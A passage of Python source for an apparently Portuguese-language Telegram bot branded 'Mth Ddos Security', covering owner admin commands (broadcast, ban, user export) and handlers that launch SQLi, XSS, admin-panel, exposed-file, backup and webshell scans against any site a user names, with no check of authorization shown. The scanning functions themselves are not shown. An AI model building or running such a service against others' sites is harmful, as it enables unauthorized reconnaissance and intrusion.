                    f"📡 Progresso: {current}/{total}\n"
                    f"✅ Enviados: {sent} | ⚠️ Bloqueados: {blocked} | ❌ Falhas: {failed}")
        try:
            HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
                "chat_id": owner_chat_id,
                "message_id": progress_msg_id,
                "text": new_text,
                "parse_mode": "HTML"
            }, timeout=5)
        except:
            pass

    for idx, u in enumerate(users):
        uid = str(u['id'])
        success = False
        fatal = False
        if media_type:
            api_method = {
                'sticker': 'sendSticker',
                'photo': 'sendPhoto',
                'animation': 'sendAnimation',
                'video': 'sendVideo',
            }.get(media_type, '')
            if not api_method:
                return sent, failed, blocked
            payload = {"chat_id": uid}
            if media_type == 'sticker':
                payload["sticker"] = file_id
            else:
                payload[media_type] = file_id
                payload["caption"] = broadcast_text or ''
                payload["parse_mode"] = "HTML"
            success, fatal = _broadcast_retry_send(api_method, payload)
        else:
            payload = {
                "chat_id": uid,
                "text": broadcast_text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            }
            success, fatal = _broadcast_retry_send('sendMessage', payload)
        if success:
            sent += 1
            # For stickers, also send caption text after
            if media_type == 'sticker' and broadcast_text:
                time.sleep(0.15)
                _broadcast_retry_send('sendMessage', {
                    "chat_id": uid, "text": broadcast_text, "parse_mode": None
                }, max_retries=0)
        elif fatal:
            blocked += 1
        else:
            failed += 1
        # Rate limit to avoid 429 (Telegram allows 30 msg/s to different chats)
        time.sleep(0.05)
        # Edit progress message (not send new one)
        if (idx + 1) % update_interval == 0 or (idx + 1) == total:
            _edit_progress(sent, failed, blocked, idx + 1, total)
    return sent, failed, blocked


def handle_msg(chat_id, user_id, username, first_name, last_name, args, reply_media=None):
    """OWNER ONLY: Broadcast message to ALL users in the database.
    Supports replying to a sticker/photo with /msg to send media + caption."""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "msg")

    message_text = ' '.join(args) if args else ''

    # If no media reply and no text, show usage
    if not reply_media and not args:
        send_msg(user_id, chat_id, "❌ Use: /msg &lt;sua mensagem&gt;\nOu envie um sticker/imagem e responda com /msg &lt;sua mensagem&gt;")
        return

    # Get all users from database (including owners so everyone gets notified)
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT id, username, first_name FROM users")
            users = [dict(r) for r in c.fetchall()]
    except Exception as e:
        print(f"[DB Error] handle_msg: {e}")
        send_msg(user_id, chat_id, "❌ Erro ao buscar lista de usuários.")
        return

    if not users:
        send_msg(user_id, chat_id, "ℹ️ Nenhum usuário encontrado para enviar.")
        return

    total = len(users)

    if reply_media:
        # MEDIA BROADCAST
        media_type = reply_media.get('type')
        file_id = reply_media.get('file_id')
        caption = f"📢 {message_text}" if message_text else ''

        type_label = {
            'sticker': 'sticker',
            'photo': 'imagem',
            'animation': 'GIF',
            'video': 'vídeo',
        }.get(media_type, 'mídia')

        send_msg(user_id, chat_id,
            f"📢 <b>Broadcast de {type_label} iniciado!</b>\n👥 Total de usuários: {total}\n━━━━━━━━━━━━━━━━━━━━━━\n<i>O progresso será atualizado em uma única mensagem...</i>")
        sent, failed, blocked = _do_broadcast(media_type, file_id, caption, users, chat_id, user_id)
    else:
        # TEXT BROADCAST
        send_msg(user_id, chat_id,
            f"📢 <b>Broadcast iniciado!</b>\n👥 Total de usuários: {total}\n📝 Mensagem: {escape_html(message_text[:100])}\n━━━━━━━━━━━━━━━━━━━━━━\n<i>O progresso será atualizado em uma única mensagem...</i>")
        broadcast = f"""📢 <b>Mensagem dos Donos</b>
━━━━━━━━━━━━━━━━━━━━━━
{escape_html(message_text)}
━━━━━━━━━━━━━━━━━━━━━━
<i>— Mth Ddos Security Team</i>"""
        sent, failed, blocked = _do_broadcast(None, None, broadcast, users, chat_id, user_id)
    final_pct = ((sent + failed + blocked) / total * 100) if total else 0
    # Replace the progress message with final result
    send_msg(user_id, chat_id,
        f"✅ <b>Broadcast concluído!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total: {total}\n"
        f"✅ Enviado com sucesso: {sent}\n"
        f"⚠️ Bloqueados: {blocked}\n"
        f"❌ Falhas: {failed}\n"
        f"📊 Taxa de entrega: {final_pct:.0f}%")

# ═══════════════════════════════════════════════════════════════
#  NEW HANDLERS: /stats, /ban, /unban, /export, /uptime
# ═══════════════════════════════════════════════════════════════

def handle_stats(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: View stats of a specific user or all users"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "stats")

    # If args provided, search for specific user
    if args:
        search_term = ' '.join(args)
        try:
            user_data = []
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                # Search by username or user_id
                c.execute("SELECT * FROM users WHERE username LIKE ? OR id = ? ORDER BY command_count DESC",
                          (f"%{search_term}%", search_term))
                rows = c.fetchall()

                if not rows:
                    send_msg(user_id, chat_id, f"🔍 Nenhum usuário encontrado para: {escape_html(search_term)}")
                    return

                msg = f"📊 <b>Estatísticas — Buscar: {escape_html(search_term)}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows[:10]:
                    d = dict(r)
                    uname = d.get('username') or ''
                    fname = d.get('first_name') or ''
                    if uname:
                        msg += f"\n<b>@{escape_html(uname)}</b> (ID: {d['id']})\n"
                    elif fname:
                        msg += f"\n<b>{escape_html(fname)}</b> (ID: {d['id']})\n"
                    else:
                        msg += f"\n<b>ID {d['id']}</b>\n"
                    msg += f"  Nome: {escape_html(d['first_name'])} {escape_html(d['last_name'] or '')}\n"
                    msg += f"  Comandos: {d['command_count']}\n"
                    msg += f"  Dono: {'Sim' if d['is_owner'] else 'Não'}\n"
                    msg += f"  Primeiro acesso: {d['first_seen']}\n"
                    msg += f"  Último acesso: {d['last_seen']}\n"
                    # Get user's top commands (still inside with block)
                    c2 = conn.cursor()
                    c2.execute("SELECT command, COUNT(*) as cnt FROM logs WHERE user_id = ? GROUP BY command ORDER BY cnt DESC LIMIT 3",
                               (d['id'],))
                    top_cmds = c2.fetchall()
                    if top_cmds:
                        top_parts = []
                        for dd in top_cmds:
                            ddd = dict(dd)
                            top_parts.append(f"/{ddd['command']}({ddd['cnt']}x)")
                        msg += f"  Top comandos: {', '.join(top_parts)}\n"

            send_msg(user_id, chat_id, msg[:4000])
        except Exception as e:
            print(f"[DB Error] handle_stats: {e}")
            log_error("stats", str(e))
            send_msg(user_id, chat_id, "❌ Erro ao buscar estatísticas.")
            return
    else:
        # General stats
        stats = get_user_stats()
        uptime_secs = int(time.time() - BOT_START_TIME)
        hours, mins, secs = uptime_secs // 3600, (uptime_secs % 3600) // 60, uptime_secs % 3600 % 60

        # Top 10 users by command count
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                c.execute("SELECT id, username, first_name, command_count FROM users ORDER BY command_count DESC LIMIT 10")
                top_users = [dict(r) for r in c.fetchall()]
        except:
            top_users = []

        msg = f"""📊 <b>MTH Security v5.2 — Estatísticas</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>📈 Gerais:</b>
👥 Total de usuários: {stats['total']}
👑 Donos: {stats['owners']}
👤 Regulares: {stats['regular']}
📝 Comandos registrados: {stats['commands']}
⏱️ Uptime: {hours}h {mins}m {secs}s
🚫 Banidos: {len(BANNED_USERS)}
📦 Cache: {len(RESULT_CACHE)} entradas

<b>🏆 Top 10 Usuários (mais ativos):</b>"""

        for i, u in enumerate(top_users, 1):
            uname = u.get('username') or ''
            fname = u.get('first_name') or ''
            if uname:
                display = f"@{escape_html(uname)}"
            elif fname:
                display = escape_html(fname)
            else:
                display = f"ID {u['id']}"
            msg += f"\n  {i}. {display} — {u['command_count']} comandos"

        send_msg(user_id, chat_id, msg)


def handle_ban(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Ban a user from using the bot"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "ban")

    if not args:
        send_msg(user_id, chat_id, "❌ Use: /ban &lt;user_id&gt; [motivo]\nExemplo: /ban 123456789 Spam de comandos")
        return

    target_id = int(args[0]) if args[0].isdigit() else None
    if not target_id:
        send_msg(user_id, chat_id, "❌ ID inválido. Use o número do ID do usuário.")
        return

    if target_id in OWNERS:
        send_msg(user_id, chat_id, "🚫 <b>Não é possível banir um dono!</b>")
        return

    reason = ' '.join(args[1:]) if len(args) > 1 else "Sem motivo especificado"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO banned_users (user_id, username, reason, banned_at, banned_by) VALUES (?, ?, ?, ?, ?)",
                      (target_id, args[0], reason, now, user_id))
            conn.commit()

        BANNED_USERS.add(target_id)

        # Try to get username
        try:
            resp = HTTP_SESSION.get(f"{API_URL}/getChat", json={"chat_id": target_id}, timeout=5)
            if resp.status_code == 200:
                chat_data = resp.json().get('result', {})
                target_user = chat_data.get('username', f"ID {target_id}")
            else:
                target_user = f"ID {target_id}"
        except:
            target_user = f"ID {target_id}"

        send_msg(user_id, chat_id, f"✅ <b>Usuário banido!</b>\n👤 {escape_html(target_user)}\n📝 Motivo: {escape_html(reason)}")
    except Exception as e:
        print(f"[DB Error] handle_ban: {e}")
        log_error("ban", str(e))
        send_msg(user_id, chat_id, "❌ Erro ao banir usuário.")
        return

def handle_unban(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Unban a user"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "unban")

    if not args or not args[0].isdigit():
        send_msg(user_id, chat_id, "❌ Use: /unban &lt;user_id&gt;\nExemplo: /unban 123456789")
        return

    target_id = int(args[0])

    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("DELETE FROM banned_users WHERE user_id = ?", (target_id,))
            conn.commit()

        BANNED_USERS.discard(target_id)

        send_msg(user_id, chat_id, f"✅ <b>Usuário desbanido!</b>\nID: {target_id}")
    except Exception as e:
        print(f"[DB Error] handle_unban: {e}")
        log_error("unban", str(e))
        send_msg(user_id, chat_id, "❌ Erro ao desbanir usuário.")
        return


def handle_export(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Export user list to TXT file"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "export")

    send_msg(user_id, chat_id, "⏳ <b>Exportando lista de usuários...</b>")

    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT * FROM users ORDER BY command_count DESC")
            users = [dict(r) for r in c.fetchall()]
    except Exception as e:
        print(f"[DB Error] handle_export: {e}")
        log_error("export", str(e))
        send_msg(user_id, chat_id, "❌ Erro ao exportar lista.")
        return

    if not users:
        send_msg(user_id, chat_id, "ℹ️ Nenhum usuário encontrado.")
        return

    export_text = "Mth Ddos Security - Exportação de Usuários\n"
    export_text += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    export_text += f"Total: {len(users)} usuários\n"
    export_text += "=" * 60 + "\n\n"

    for u in users:
        uname = u.get('username') or ''
        fname = u.get('first_name') or ''
        display = f"@{uname}" if uname else (fname or f"ID {u['id']}")
        export_text += f"ID: {u['id']} | {display} | {fname} {u.get('last_name') or ''} | "
        export_text += f"Owner: {'Sim' if u['is_owner'] else 'Não'} | "
        export_text += f"Cmds: {u['command_count']} | "
        export_text += f"First: {u['first_seen']} | Last: {u['last_seen']}\n"

    # Use send_document helper which has its own error handling
    success = send_document(chat_id, export_text, "users_export.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>Exportação concluída!</b>\n📤 {len(users)} usuários exportados.")
    else:
        send_msg(user_id, chat_id, "❌ Falha ao enviar o arquivo.")
        return


def handle_listdn(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: List all owner-exclusive commands"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "listdn")

    msg = """👑 <b>Comandos de Dono — Mth Ddos v5.2</b>
━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Administrativos:</b>
  /botpanel — Painel de estatísticas do bot
  /stats [username] — Stats gerais ou busca por usuário
  /logs — Últimos comandos executados
  /logs user:&lt;id&gt; — Comandos de um usuário específico
  /log &lt;user_id&gt; — Audit logs detalhados
  /log audit — Audit log geral
  /clearlogs — Limpar logs antigos
  /top — Top sites mais escaneados

🔧 <b>Gerenciamento:</b>
  /maintenance [on/off/mensagem] — Modo manutenção
  /cooldown &lt;user_id&gt; &lt;limite&gt; — Rate limit custom
  /vip add/remove &lt;user_id&gt; — Gerenciar VIPs

📢 <b>Broadcast:</b>
  /msg &lt;texto&gt; — Enviar mensagem pra todos
  /msg &lt;texto&gt; (responder sticker) — Enviar sticker + mensagem
  /msg &lt;texto&gt; (responder foto) — Enviar foto + legenda
  /msg &lt;texto&gt; (responder GIF) — Enviar GIF + legenda
  /msg &lt;texto&gt; (responder vídeo) — Enviar vídeo + legenda
  /broadcast &lt;min&gt; &lt;texto&gt; — Agendar broadcast

👥 <b>Usuários:</b>
  /export — Exportar lista de usuários pra TXT
  /ban &lt;id&gt; [motivo] — Banir usuário do bot
  /unban &lt;id&gt; — Desbanir usuário

📋 <b>Outros:</b>
  /listdn — Mostrar esta lista (este comando)
  /bancodds — Dump do banco de dados

━━━━━━━━━━━━━━━━━━━━━━
  🔒 Exclusivo para donos do bot"""

    send_msg(user_id, chat_id, msg)


def handle_uptime(chat_id, user_id, username, first_name, last_name, args):
    """Show bot uptime (available to everyone)"""
    log_user(user_id, username, first_name, last_name)

    uptime_secs = int(time.time() - BOT_START_TIME)
    days = uptime_secs // 86400
    hours = (uptime_secs % 86400) // 3600
    mins = (uptime_secs % 3600) // 60
    secs = uptime_secs % 60

    msg = f"""⏱️ <b>MTH Security v5.2 — Uptime</b>
━━━━━━━━━━━━━━━━━━━━━━

🟢 <b>Online há:</b>
"""
    if days > 0:
        msg += f"  {days} dias, "
    msg += f"{hours} horas, {mins} minutos e {secs} segundos\n"
    msg += f"\n📅 Iniciado em: {datetime.fromtimestamp(BOT_START_TIME).strftime('%d/%m/%Y %H:%M:%S')}\n"
    msg += f"⏰ Agora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━"

    send_msg(user_id, chat_id, msg)


def handle_status(chat_id, user_id, username, first_name, last_name, args):
    """Quick health check and bot status"""
    log_user(user_id, username, first_name, last_name)
    uptime_secs = int(time.time() - BOT_START_TIME)
    hours, mins, secs = uptime_secs // 3600, (uptime_secs % 3600) // 60, uptime_secs % 60
    stats = get_user_stats()
    # Gather system info
    try:
        import resource
        mem_mb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024  # KB to MB
    except:
        mem_mb = 0
    try:
        db_size = os.path.getsize(DB_PATH) / 1024 if os.path.exists(DB_PATH) else 0
    except:
        db_size = 0
    active_threads = threading.active_count()

    msg = f"""📊 <b>Mth Ddos Security v5.2 — Status</b>
━━━━━━━━━━━━━━━━━━━━━━
🟢 <b>Online</b> | Uptime: {hours}h {mins}m {secs}s
👥 Usuários: {stats['total']} (Donos: {stats['owners']})
📝 Comandos registrados: {stats['commands']}
💾 RAM usada: {mem_mb:.1f} MB
🧵 Threads ativas: {active_threads}
🗃️ Banco: {db_size:.1f} KB
━━━━━━━━━━━━━━━━━━━━━━"""
    send_msg(user_id, chat_id, msg)


def handle_feedback(chat_id, user_id, username, first_name, last_name, args):
    """Send feedback to the channel. Available to everyone."""
    log_user(user_id, username, first_name, last_name)

    if not args:
        send_msg(user_id, chat_id, "❌ Use: /feedback &lt;sua mensagem&gt;\nExemplo: /feedback Bot está muito rápido!")
        return

    message_text = ' '.join(args)
    log_command(user_id, username, "feedback", "")

    # Count existing feedbacks from this user for ID
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM feedback WHERE user_id = ?", (user_id,))
            user_feedback_count = c.fetchone()[0] + 1
    except:
        user_feedback_count = 1

    # Send to channel
    channel_msg_id = send_feedback_to_channel(user_id, username, first_name, message_text, "feedback")

    # Save to DB
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO feedback (user_id, username, first_name, message, timestamp, channel_msg_id) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, username, first_name, message_text, now, channel_msg_id))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] handle_feedback: {e}")

    msg = f"""━━━━━━━━━━━━━━━━━━━━━━
🔰 ✅ FEEDBACK ENVIADO
━━━━━━━━━━━━━━━━━━━━━━
│ Obrigado, {escape_html(first_name)}!
│ Sua mensagem foi registrada com sucesso.
│ ID do feedback: #{user_feedback_count}
━━━━━━━━━━━━━━━━━━━━━━"""
    send_msg(user_id, chat_id, msg)


def handle_report(chat_id, user_id, username, first_name, last_name, args):
    """Report a bug to the channel. Available to everyone."""
    log_user(user_id, username, first_name, last_name)

    if not args:
        send_msg(user_id, chat_id, "❌ Use: /bugreport &lt;descrição do bug&gt;\nExemplo: /bugreport /sqli não funciona com https")
        return

    message_text = ' '.join(args)
    log_command(user_id, username, "report", "")

    # Count existing reports from this user for ID
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM bug_reports WHERE user_id = ?", (user_id,))
            user_report_count = c.fetchone()[0] + 1
    except:
        user_report_count = 1

    # Send to channel
    channel_msg_id = send_feedback_to_channel(user_id, username, first_name, message_text, "report")

    # Save to DB
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO bug_reports (user_id, username, first_name, message, timestamp, channel_msg_id) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, username, first_name, message_text, now, channel_msg_id))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] handle_report: {e}")

    msg = f"""━━━━━━━━━━━━━━━━━━━━━━
🐛 ✅ BUG REPORTADO
━━━━━━━━━━━━━━━━━━━━━━
│ Obrigado, {escape_html(first_name)}!
│ Seu relatório de bug foi registrado.
│ ID do relatório: #{user_report_count}
│ Os donos serão notificados.
━━━━━━━━━━━━━━━━━━━━━━"""
    send_msg(user_id, chat_id, msg)


def handle_stop(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Stop a running scan"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "stop")

    if args:
        # Stop a specific user's scan
        target_user_id = int(args[0]) if args[0].isdigit() else None
        if target_user_id and target_user_id in STOP_EVENTS:
            STOP_EVENTS[target_user_id].set()
            # Also stop in ACTIVE_SCANS
            for scan_id, event in list(ACTIVE_SCANS.items()):
                if str(target_user_id) in scan_id:
                    event.set()
            send_msg(user_id, chat_id, f"✅ <b>Scan do usuário {target_user_id} parado!</b>")
        else:
            send_msg(user_id, chat_id, f"❌ Nenhum scan ativo encontrado para o ID {target_user_id}.")
    else:
        # Show active scans
        if not STOP_EVENTS:
            send_msg(user_id, chat_id, "📋 <b>Nenhum scan ativo no momento.</b>")
            return

        msg = "📋 <b>Scans Ativos</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        for uid, event in STOP_EVENTS.items():
            msg += f"  👤 ID: {uid} — {'Rodando' if not event.is_set() else 'Parando...'}\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += "Use /stop &lt;user_id&gt; para parar um scan específico."
        send_msg(user_id, chat_id, msg)


def handle_rescan(chat_id, user_id, username, first_name, last_name, args):
    """Handle inline button 'Rescan' callback"""
    log_user(user_id, username, first_name, last_name)

    if not args:
        send_msg(user_id, chat_id, "❌ Use: /rescan &lt;comando&gt; &lt;target&gt;\nExemplo: /rescan sqli example.com")
        return

    if len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /rescan &lt;comando&gt; &lt;target&gt;\nExemplo: /rescan sqli example.com")
        return

    scan_cmd = '/' + args[0]
    target = args[1]
    scan_id = f"rescan_{user_id}_{time.time()}"

    # Set stop event
    STOP_EVENTS[user_id] = threading.Event()

    if scan_cmd == '/sqli':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan SQLi</b> em {escape_html(target)}...")
        result = tool_sqli(target)
        db_cache_set("sqli", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/xss':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan XSS</b> em {escape_html(target)}...")
        result = tool_xss_scanner(target)
        db_cache_set("xss", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/admin':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Admin</b> em {escape_html(target)}...")
        result = tool_admin_finder(target, chat_id, None)
        db_cache_set("admin", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/panel':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Painel Admin</b> em {escape_html(target)}...")
        progress_msg_id = send_progress(chat_id, scan_id, 0, 100, "Escaneando paths...")
        result = tool_admin_finder(target, chat_id, progress_msg_id)
        finish_progress(progress_msg_id, chat_id, result)
        db_cache_set("panel", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/ports':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Portas</b> em {escape_html(target)}...")
        result = tool_port_scanner(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/dirs':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Diretórios</b> em {escape_html(target)}...")
        result = tool_directory_scanner(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/sub':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Subdomínios</b> em {escape_html(target)}...")
        result = tool_subdomain_scanner(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/wp':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan WordPress</b> em {escape_html(target)}...")
        result = tool_wordpress_scanner(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/dns':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan DNS</b> de {escape_html(target)}...")
        result = tool_dns_tools(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/cms':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan CMS</b> em {escape_html(target)}...")
        result = tool_cms_detector(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/reverse':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Reverse IP</b> de {escape_html(target)}...")
        result = tool_reverse_ip(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/ftpssh':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan FTP/SSH</b> em {escape_html(target)}...")
        result = tool_ftp_ssh(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/info':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Info</b> de {escape_html(target)}...")
        result = tool_website_info(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/emails':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Emails</b> de {escape_html(target)}...")
        result = tool_email_scraper(target)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/ssl':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan SSL</b> de {escape_html(target)}...")
        result = tool_ssl_audit(target)
        db_cache_set("ssl", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/headers':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Headers</b> de {escape_html(target)}...")
        result = tool_headers_analysis(target)
        db_cache_set("headers", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/cors':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan CORS</b> de {escape_html(target)}...")
        result = tool_cors_test(target)
        db_cache_set("cors", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/robots':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Robots</b> de {escape_html(target)}...")
        result = tool_robots_txt(target)
        db_cache_set("robots", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/sitemap':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Sitemap</b> de {escape_html(target)}...")
        result = tool_sitemap(target)
        db_cache_set("sitemap", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/tech':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Tech</b> de {escape_html(target)}...")
        result = tool_tech_detect(target)
        db_cache_set("tech", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/exposed':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Exposed</b> de {escape_html(target)}...")
        result = tool_exposed_files(target)
        db_cache_set("exposed", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/backup':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Backup</b> de {escape_html(target)}...")
        result = tool_backup_finder(target)
        db_cache_set("backup", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/api':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan API</b> de {escape_html(target)}...")
        result = tool_api_discovery(target)
        db_cache_set("api", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/shell':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Shell</b> de {escape_html(target)}...")
        result = tool_webshell_hunter(target)
        db_cache_set("shell", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/config':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Config</b> em {escape_html(target)}...")
        result = tool_config_scanner(target)
        db_cache_set("config", target, result)
        send_msg(user_id, chat_id, result)
    elif scan_cmd == '/scanall':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Completo</b> em {escape_html(target)}...")
        handle_scanall(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/deep':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Deep</b> em {escape_html(target)}...")
        handle_deep(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/quick':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Quick</b> em {escape_html(target)}...")
        handle_quick(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/http':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan HTTP</b> em {escape_html(target)}...")
        handle_http(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/sslchain':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan SSL Chain</b> em {escape_html(target)}...")
        handle_sslchain(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/report':
        send_msg(user_id, chat_id, f"🔍 <b>Rescan Report</b> em {escape_html(target)}...")
        handle_report_url(chat_id, user_id, username, first_name, last_name, [target])
    else:
        lang = get_user_lang(user_id)
        if lang == 'en':
            send_msg(user_id, chat_id, f"❌ Command /{args[0]} not supported for rescan.")
        elif lang == 'es':
            send_msg(user_id, chat_id, f"❌ Comando /{args[0]} no soportado para rescan.")
        else:
            send_msg(user_id, chat_id, f"❌ Comando /{args[0]} não suportado para rescan.")

    # Cleanup stop event
    if user_id in STOP_EVENTS:
        del STOP_EVENTS[user_id]


# ═══════════════════════════════════════════════════════════════
#  V5.0: NEW HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_ssl(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /ssl &lt;url&gt;\nExemplo: /ssl google.com")
        return
    target = args[0]
    log_command(user_id, username, "ssl", target)
    send_msg(user_id, chat_id, f"🔍 <b>Auditando SSL/TLS</b> em {escape_html(extract_hostname(target))}...")
    result = tool_ssl_audit(target)
    db_cache_set("ssl", target, result)
    send_msg(user_id, chat_id, result)

def handle_headers(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /headers &lt;url&gt;\nExemplo: /headers google.com")
        return
    target = args[0]
    log_command(user_id, username, "headers", target)
    send_msg(user_id, chat_id, f"🔍 <b>Analisando headers</b> em {escape_html(extract_hostname(target))}...")
    result = tool_headers_analysis(target)
    db_cache_set("headers", target, result)
    send_msg(user_id, chat_id, result)

def handle_cors(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /cors &lt;url&gt;\nExemplo: /cors google.com")
        return
    target = args[0]
    log_command(user_id, username, "cors", target)
    send_msg(user_id, chat_id, f"🔍 <b>Testando CORS</b> em {escape_html(extract_hostname(target))}...")
    result = tool_cors_test(target)
    db_cache_set("cors", target, result)
    send_msg(user_id, chat_id, result)

def handle_robots(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /robots &lt;url&gt;\nExemplo: /robots google.com")
        return
    target = args[0]
    log_command(user_id, username, "robots", target)
    send_msg(user_id, chat_id, f"🔍 <b>Analisando robots.txt</b> em {escape_html(extract_hostname(target))}...")
    result = tool_robots_txt(target)
    db_cache_set("robots", target, result)
    send_msg(user_id, chat_id, result)

def handle_sitemap(chat_id, user_id, username, first_name, last_name, args):
